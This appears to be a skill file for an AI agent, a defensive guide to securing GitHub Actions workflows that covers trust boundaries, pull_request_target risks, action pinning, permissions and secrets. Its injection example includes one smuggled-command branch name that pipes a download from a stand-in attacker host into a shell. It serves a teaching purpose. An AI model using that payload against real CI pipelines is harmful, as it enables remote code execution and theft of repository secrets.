---
name: workflow-security
description: "Use when editing a CI workflow or its permissions."
version: 1.0.0
author: "Effect (effect, ci-maintenance), via pingdotgg/t3code, adapted for Hermes"
license: MIT
platforms: [linux, macos, windows]
category: security
metadata:
  hermes:
    tags: [ci, github-actions, permissions, supply-chain, secrets, trust-boundary]
    source: effect@t3code-vendored (.repos/effect/.agents/skills/ci-maintenance), pinned via pingdotgg/t3code@e5d757f51b342a5ebc50312790e39a1baca61194
    related_skills: [defensive-patterns, oss-forensics, git-history-sanitisation]
writes: [none]
side_effects: [none]
---

# Workflow security

A workflow file is executable code that runs with a token, secrets and write access on a
machine you do not administer, triggered by events you do not control. Audit the **trust
boundary** before editing anything else: which untrusted value reaches which sink, with what
credential.

## When to Use

- Authoring or reviewing a workflow or a composite action.
- Changing a trigger, a `permissions:` block, an action reference, a secret's use, an
  artifact, a cache key, or a concurrency group.
- A workflow "needs secrets on a fork PR" — the request is usually the vulnerability.
- Don't use for: the code being built or tested; a git-history problem
  (`git-history-sanitisation`); a compromised dependency (`oss-forensics`).

## The boundary question, asked first

> **Which value in this workflow came from someone who is not a maintainer, and what does it
> reach?**

Answer it in one line before editing. If the answer is "a checkout, then `npm install`, then
a `run:` step", the workflow is already arbitrary-code execution and the only question left
is which credential it holds.

Events that hand a stranger a token:

| Pattern | Why it escalates |
|---|---|
| `pull_request_target` + a checkout of `github.event.pull_request.head.sha` | Runs in the base repository's context with its token and secrets, on the fork's code. The canonical pwn. |
| `pull_request_target` + `run:` interpolating a PR title, branch or body | `${{ }}` is substituted **before** the shell parses, so a quote in a title is a command. |
| `workflow_run` | Runs in the base repository's context with write scopes, even when the triggering run came from a fork. |
| `issue_comment` / `discussion_comment` with a write token | Anyone who can comment can trigger it; the comment body is attacker input. |
| `workflow_dispatch` with an input used in `run:` | Only as safe as who can dispatch — and the input is still text. |

`pull_request` from a fork is the *safe* one: read-only token, no secrets. Do not "fix" a
workflow that cannot read a secret there by switching it to `pull_request_target`; move the
privileged work to a separate workflow triggered on a trusted event instead.

## Rules

**Never interpolate an expression into a shell.** `${{ }}` in `run:` is string
substitution, not quoting. Pass the value through `env:` and quote it in the shell, or hand
it to the program as an argument.

```yaml
# Injection: a branch named  x"; curl evil.sh | sh; #  runs.
- run: echo "Building ${{ github.head_ref }}"

# Substituted into the environment, then quoted by the shell.
- env:
    BRANCH: ${{ github.head_ref }}
  run: printf '%s\n' "$BRANCH"
```

**Set `permissions:` explicitly, at the job level, to the least that works.** The default is
whatever the repository or organisation configured — which may be read-write — so an
unstated permission is an unknown privilege, not none. Start from `contents: read` and add
one key at a time, on the job that needs it.

**Pin every action to a full commit SHA.** A tag or branch is a mutable reference: the
publisher, or anyone who compromises them, can retarget it at code you never reviewed. Keep
the version in a trailing comment so a human can read the pin. This repository's gate
(`nix/pins.nix`) fails on a range or a bare major — the rule there is the rule here.

**Treat a secret as radioactive.** Never `echo` one, never pass one to an action you have
not pinned, and never put one in a matrix value or a step name — those are rendered in the
log. A secret derived at runtime gets `::add-mask::` before it is used in any command.

**An artifact and a cache are attacker-controlled when an untrusted run produced them.**
Downloading an artifact from a fork's run and then executing, sourcing or `unzip`-ing it over
the workspace is the same escalation as checking out the fork. Caches keyed on a lockfile
cross the same boundary: a cache written by an untrusted run and restored by a trusted one
is a supply-chain path. Separate the keys, or do not share the cache with untrusted runs.

**Bound every job.** `timeout-minutes` on each job, so a hung step cannot occupy a runner for
the default hour. `concurrency:` keyed on the ref with `cancel-in-progress: true` for pull
requests, so a superseded push stops paying; never put a deployment behind a group that a
cancelled run can leave locked.

**Pin the runner, not the alias.** `ubuntu-latest` moves under you and changes the toolchain
between two runs of the same commit. Where the build depends on it, name the version.

**An `if:` on an actor is not authorization.** `github.actor` and `github.triggering_actor`
are checkable, but an author check on a fork-triggered event does not make the checkout
safe — the boundary is the credential, not the name.

## Reviewing versus implementing

- **A review produces findings, not edits.** Report each finding with its event, value, sink
  and credential, and the smallest fix. Do not "tidy" a workflow you were asked to review.
- **An implementation makes the smallest boundary-preserving change.** If the fix requires a
  second workflow, say so and get agreement before adding one — two workflows with different
  tokens is a design change, not an edit.

## Pitfalls

1. **`permissions: write-all`** added to make a step work. Find the one scope it needed.
2. **A pinned action, unpinned transitive Docker image** (`container:` in a job). The image
   reference is a supply-chain input too; pin a digest where it matters.
3. **A secret printed by a failing command.** A verbose `set -x` around a token is enough.
4. **`pull_request_target` with a checkout** accepted because the fork "is from a regular
   contributor this time".
5. **A cache key that omits the untrusted dimension** — the trusted job restores poisoned
   content.
6. **A required check that only runs on `push`**, so a PR bypasses it and the branch
   protection rule protects nothing.
7. **A workflow copied from a blog post**, carrying its token scopes and its unpinned
   third-party actions.

## Verification

- [ ] One line names the untrusted value and its sink, or states there is none
- [ ] No `${{ }}` expression appears inside a `run:` block
- [ ] `permissions:` is present on every job, and every key it grants is used by that job
- [ ] Every `uses:` is a full commit SHA
- [ ] No artifact or cache crosses from an untrusted run into a privileged job
- [ ] Every job has `timeout-minutes`; PR workflows set `concurrency` with cancellation
- [ ] No secret reaches a log, a step name, a matrix value or an unpinned action